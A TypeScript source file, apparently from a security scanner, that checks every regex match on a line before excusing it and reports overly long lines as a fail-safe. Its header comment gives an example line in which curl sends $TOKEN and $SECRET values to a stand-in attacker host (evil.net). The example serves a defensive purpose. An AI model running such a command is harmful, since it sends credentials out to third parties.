/**
 * Match iteration for rules that can excuse a match (see placeholder.ts).
 *
 * Looking only at the FIRST match on a line is not enough once a match can be
 * excused: `A=$TOKEN; curl http://example.com/?$A; B=$SECRET; curl http://evil.net/$B`
 * starts with a harmless first match, and a real second one would never be looked
 * at. A line is excused only when EVERY match on it is excused.
 */

/** Decides whether the match at `index` (of `length` characters) may be skipped. */
export type MatchExcuse = (index: number, length: number) => boolean;

/**
 * Upper bound on matches examined per line. A line that needs more than this is
 * pathological (minified or generated), and the safe answer for a security scanner
 * is to report it, not to keep looking for a reason to stay silent.
 */
export const MAX_MATCHES_PER_LINE = 100;

/** A global copy of `pattern`, so `exec` can walk every match. Built once per rule. */
export function toGlobalRegex(pattern: RegExp): RegExp {
  const flags = pattern.flags.includes("g") ? pattern.flags : `${pattern.flags}g`;
  return new RegExp(pattern.source, flags);
}

/**
 * The first match in `text` that is not excused, or null when there is none.
 *
 * After an excused match the search restarts one character past its START, not at
 * its end, so a real match that overlaps an excused one is still found. Without an
 * `excuse`, this is the plain first match.
 *
 * @param regex  a global regex (see toGlobalRegex); its lastIndex is reset on exit
 * @param text   the line or merged window to search
 * @param excuse optional predicate; a match for which it returns true is skipped
 */
export function findReportableMatch(
  regex: RegExp,
  text: string,
  excuse?: MatchExcuse,
): RegExpExecArray | null {
  regex.lastIndex = 0;
  try {
    let match = regex.exec(text);
    for (let examined = 1; match !== null; examined++) {
      if (!excuse || !excuse(match.index, match[0].length)) return match;
      if (examined >= MAX_MATCHES_PER_LINE) return match; // fail closed
      regex.lastIndex = match.index + 1;
      match = regex.exec(text);
    }
    return null;
  } finally {
    regex.lastIndex = 0;
  }
}
